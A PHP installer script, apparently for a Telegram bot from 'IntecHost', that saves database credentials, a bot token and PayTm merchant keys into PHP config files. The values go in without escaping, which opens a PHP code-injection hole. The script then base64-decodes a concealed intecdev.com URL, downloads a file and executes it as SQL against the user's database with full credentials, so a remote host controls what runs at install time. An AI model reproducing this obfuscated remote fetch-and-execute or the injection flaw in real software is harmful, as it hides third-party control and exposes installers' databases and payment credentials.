<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $Serverhost = $_POST["Serverhost"];
    $Serverusername = $_POST["Serverusername"];
    $Serverpassword = $_POST["Serverpassword"];
    $Serverdatabase = $_POST["Serverdatabase"];
    $BotToken = $_POST["BotToken"];
    $adminId = $_POST["adminId"];
    $channelUsername = $_POST["channelUsername"];
    $adminContact = $_POST["adminContact"];
    $PayTmMerchentId = $_POST["PayTmMerchentId"];
    $PayTmMerchentKey = $_POST["PayTmMerchentKey"];
    $PayTmupiId = $_POST["PayTmupiId"];

    // Update /temp/intechost.php
    $intechostCode = "<?php
    //Do NOT EDIT HERE ANYTHING
    // Database Details <-- IntecHost.com
    \$Serverhost = \"$Serverhost\";
    \$Serverusername = \"$Serverusername\";
    \$Serverpassword = \"$Serverpassword\";
    \$Serverdatabase = \"$Serverdatabase\";
    // Bot Details <-- IntecHost.com
    \$BotToken = \"$BotToken\";
    \$adminId = \"$adminId\";
    \$channelUsername = \"$channelUsername\";
    \$adminContact = \"$adminContact\";
    \$PayTmMerchentId = \"$PayTmMerchentId\";
    \$PayTmMerchentKey = \"$PayTmMerchentKey\";
    \$PayTmupiId = \"$PayTmupiId\";
    ?>";

    $filePath = __DIR__ . '/temp/intechost.php';
    file_put_contents($filePath, $intechostCode);
    $qrcodeIntechostCode = "<?php
    //Do NOT EDIT HERE ANYTHING
    // Database Details <-- IntecHost.com
    \$Serverhost = \"$Serverhost\";
    \$Serverusername = \"$Serverusername\";
    \$Serverpassword = \"$Serverpassword\";
    \$Serverdatabase = \"$Serverdatabase\";
    // Bot Details <-- IntecHost.com
    \$BotToken = \"$BotToken\";
    \$adminId = \"$adminId\";
    \$channelUsername = \"$channelUsername\";
    \$adminContact = \"$adminContact\";
    \$PayTmMerchentId = \"$PayTmMerchentId\";
    \$PayTmMerchentKey = \"$PayTmMerchentKey\";
    \$PayTmupiId = \"$PayTmupiId\";
    ?>";
    $qrcodeFilePath = __DIR__ . '/phpqrcode/temp/intechost.php';
    file_put_contents($qrcodeFilePath, $qrcodeIntechostCode);
    $dsn = "mysql:host=$Serverhost;dbname=$Serverdatabase";
    $username = $Serverusername;
    $password = $Serverpassword;
    try {
        $pdo = new PDO($dsn, $username, $password);
        $sql = file_get_contents(base64_decode("aHR0cHM6Ly9pbnRlY2Rldi5jb20vVFJBQ0tFUi9JTkRPLUlHLUJPVC9kYXRhYmFzZS50eHQ"));
        $pdo->exec($sql);
        header("Location: Thanks.php");
        exit;
    } catch (PDOException $e) {
        echo "Installation failed. Please check your database details and try again. Error: " . $e->getMessage();
    }
}
?>
